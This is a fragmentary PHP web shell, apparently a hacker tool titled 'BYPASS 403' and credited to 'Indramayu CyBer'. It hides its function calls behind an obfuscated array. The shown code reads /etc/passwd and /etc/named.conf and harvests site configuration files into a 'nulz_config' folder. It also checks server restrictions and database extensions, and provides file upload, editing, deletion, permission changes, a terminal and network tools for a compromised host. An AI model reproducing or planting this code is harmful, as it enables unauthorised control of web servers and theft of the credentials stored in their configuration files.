...
if ($func[12]("/etc/named.conf")) {
	...
	if (!$d0mains) {
		...
		if ($count > 0) {
			$dom = "<font style='color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);'>$count Domain</font>";
		} else {
...
$show_ds = (!empty($ds)) ? "<font class='text-danger'>$ds</font>" : "<font style='color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);'>All function is accessible</font>";
...
if (@$func[31]('open_basedir')) {
	...
	if ($func[55]($basedir_data) > 120){
		$open_b = "<font style='color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);'" . $func[41]($basedir_data, 0, 120) . "...</font>";
	} else {
		$open_b = '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);"' . $basedir_data . '</font>';
	}
} else {
...
function checkPerm($dir, $perm) {
	...
	$perm = $func[46]('>>', $perm);
	if ($func[8]($dir)) {
		return "<font style='color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[0]."</font> >> <font style='color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);' data-bs-toggle='modal' data-bs-target='#chmodModal' data-bs-perm='".trim($perm[0])."' data-bs-name='".$dir."'>".$perm[1]."</font>";
	} elseif (!$func[9]($dir)) {
...
function getConfig() {
	...
	if ($func[12]("/etc/passwd")) {
		...
		if ($func[12]("nulz_config")) {
			return "<font class='text-danger'>Folder nulz_config already exist! Please delete it first to get configs!</font>";
		} else {
			...
			return "<font class='text-success'>Success get config! Click <a href='?dir=$dir/nulz_config'>Here!</a></font>";
		}
	} else {
...
<head>
	...
	<link rel="icon" href="https://nulz-archice.vercel.app/archive/nulz.ico" type="image/x-icon" />
	...
	<div class="container-lg">
		...
		<nav class="navbar navbar-light bg-secondary">
			<div class="container-fluid">
				...
				<span class="text-end">BYPASS 403</span>
			</div>
		</nav>
		...
		<div id="tool">
			<div class="bg-secondary d-flex justify-content-center flex-wrap my-3">
				<a href="?" class="m-1 btn btn-outline-dark btn-sm fw-bold"><i class="fa fa-home"></i> Home</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#jumping" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-link"></i> Jumping</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#get-config" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-wrench"></i> Get Config</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#network" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-network-wired"></i> Network</a>
				<a class="m-1 btn btn-outline-dark btn-sm fw-bold" data-bs-toggle="collapse" href="#terminal" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-terminal"></i> Terminal</a>
			</div>
		...
		<div class="row">
			<div class="col-md-12">
				<div class="card bg-secondary border-dark text-bold fw-bold">
					<div class="card-body">
						...
						<div class="table-responsive">
							<table class="table table-hover text-nowrap">
								...
								<tr>
									<td colspan="2">CURL : <?= $func[49]('curl_version') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | SSH2 : <?= $func[49]('ssh2_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Magic Quotes : <?= $func[49]('get_magic_quotes_gpc') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MySQL : <?= $func[49]('mysql_get_client_info') || $func[83]('mysqli') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MSSQL : <?= $func[49]('mssql_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | PostgreSQL : <?= $func[49]('pg_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Oracle : <?= $func[49]('oci_connect') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?></td>
								</tr>
								<tr>
									<td colspan="2">Safe Mode : <?= @$func[31]('safe_mode') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir : <?= @$func[31]('safe_mode_exec_dir') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">'. @$func[31]('safe_mode_exec_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?> | Safe Mode Include Dir : <?= @$func[31]('safe_mode_include_dir') ? '<font style="color: #04D000; text-shadow: 0 0 15px rgba(255,255,255,0.3);">'. @$func[31]('safe_mode_include_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?></td>
								</tr>
							</table>
						</div>
					</div>
							...
							<ol class="breadcrumb">
								<?php
									...
									foreach ($scdir as $id => $pat) {
										if ($pat == '' && $id == 0) {
											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-primary" href="?dir=/">/</a></li>';
											continue;
										}
										if ($pat == '') continue;
										if ($id + 1 == $numDir) {
											echo '<li class="breadcrumb-item active text-danger" aria-current="page">'.$pat.'</li>';
										} else {
											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-primary" href="?dir=';
											for ($i = 0; $i <= $id; $i++) {
												echo "$scdir[$i]";
												if ($i != $id) echo "/";
											}
			...
			<div class="col-md-12" id="main">
				<div class="card bg-secondary border-dark fw-bold overflow-auto">
					<div class="card-body">
						...
						<?php else: ?>
							<?php if ($func[9]($dir)) : ?>
								<div class="table-responsive">
									<table class="table table-hover text-nowrap text-white">
										<thead>
											<tr>
												<th>Name</th>
												<th>Type</th>
										...
										<tbody>
											...
											?>
												<tr>
													<td>
														<?php if ($item === '..') : ?>
														<a href="?dir=<?= $func[28]($dir); ?>" class="text-decoration-none text-white"><i class="fa fa-folder-open text-warning"></i> <?= $item ?></a>
														<?php elseif ($item === '.') :  ?>
														<a href="?dir=<?= $dir; ?>" class="text-decoration-none text-white"><i class="fa fa-folder-open text-warning"></i> <?= $item ?></a>
														<?php else : ?>
														<a href="?dir=<?= $dir . '/' . $item ?>" class="text-decoration-none text-white"><i class="fa fa-folder text-warning"></i> <?= checkName($item); ?></a>
														<?php endif; ?>
													</td>
													...
													<td>
														<button type="button" class="btn btn-outline-light btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="'.$item.'"' ?>><i class="fa fa-edit"></i></button>
														<button type="button" class="btn btn-outline-light btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="'.$dir . '/' . $item.'"'?>><i class="fa fa-trash-alt"></i></button>
													</td>
												</tr>
											<?php endforeach; ?>
											<?php
											...
											?>
												<tr>
													<td class="fw-normal"><a onclick="getSource('<?= $dir . '/' . $item ?>', this)" data-bs-name="<?= $item ?>"><i class="fa fa-<?= geticon($item) ?> text-info"></i> <?= checkName($item); ?></a></td>
													<td class="text-info"><?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?></td>
													<td><?= formatSize($func[10]($item)) ?></td>
													<td class="text-primary"><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
													<td><?= getowner($item) ?></td>
													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
													<td>
														<button type="button" class="btn btn-outline-light btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
														<button type="button" class="btn btn-outline-light btn-sm mr-1" data-bs-name="<?= $item ?>" onclick="getSource('<?= $dir . '/' . $item ?>', this)"><i class="fa fa-file-signature"></i></button>
														<button type="button" class="btn btn-outline-light btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#downloadModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-download"></i></button>
														<button type="button" class="btn btn-outline-light btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-trash-alt"></i></button>
													</td>
												</tr>
											<?php endforeach; ?>
										</tbody>
			...
			<div class="col-md-12 my-3">
				<div class="card bg-secondary fw-bold border-dark">
					<div class="card-body text-center">
						Copyright © <span class="text-danger">Indramayu CyBer</span></span>
					</div>
				</div>
			</div>
		</div>
